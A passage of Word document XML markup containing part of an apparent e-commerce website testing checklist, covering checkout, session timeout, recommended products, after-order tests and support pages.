      <w:ins w:id="1150" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Check different payment options</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="174"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1151" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1152" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>If allowing check out as Guest, simply finish the purchase and provide an option to register at the end</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="174"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1153" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1154" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Returning customers – Login to check out</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="174"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1155" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1156" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>User sign up</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="174"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1157" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1158" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>If storing customer Credit card or any other financial information, perform security testing around this to make sure it is secure.(PCI compliance is a must)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="174"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1159" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1160" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>If the user is signed up for a long time, make sure the session is timed out or not. Every site has a different threshold. For some, it is 10 minutes. For some, it might be different.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="174"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1161" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1162" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Emails/Text confirmation with the order number generated</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1163" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1164" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>#6) Categories/Featured Products/Related or Recommended products</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1165" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1166" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>The most popular FAQ I get from E-commerce testers is: </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Do I have to test every category/every product?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1167" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1168" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1169" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1170" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>The answer is NO.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1171" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1172" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>If you are a returning customer you will be shown some recommended products on the home page or in your shopping cart.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1173" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E16A97A" wp14:editId="4670B012">
            <wp:extent cx="4622165" cy="1296670"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="81" name="Picture 81" descr="Testing ecommerce websites 6">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ing ecommerce websites 6">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22165" cy="1296670"/>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174" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1175" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Featured products also change almost every day.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1176" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C1F7B07" wp14:editId="0EBFA93E">
            <wp:extent cx="4622165" cy="2576830"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="80" name="Picture 80" descr="Testing ecommerce websites 7">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sting ecommerce websites 7">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22165" cy="2576830"/>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369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1177" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1178" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Since these are dynamic elements, the best way to test these parts of the application is to test the algorithm based on which these sections are populated.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1179" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1180" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Check your Data mining/BI systems and check from the backend the queries that populate these sections.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1181" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1182" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>#7) After-Order tests</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1183" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69CC6000" wp14:editId="608BCDD8">
            <wp:extent cx="4622165" cy="2576830"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="79" name="Picture 79" descr="after plac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ter placing orde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22165" cy="2576830"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1184" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1185" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Check:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="175"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1186" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1187" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Change the Order</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="175"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1188" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1189" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Cancel the Order</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="175"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1190" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1191" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Track the Order</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="175"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1192" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1193" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Returns</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1194" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1195" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">#8) </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Other</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> tests:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="176"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1196" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1197" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Login</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="176"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1198" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1199" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>FAQs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="176"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1200" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1201" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Contact Us page</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="176"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1202" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1203" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Customer Service page etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1204" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1205" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
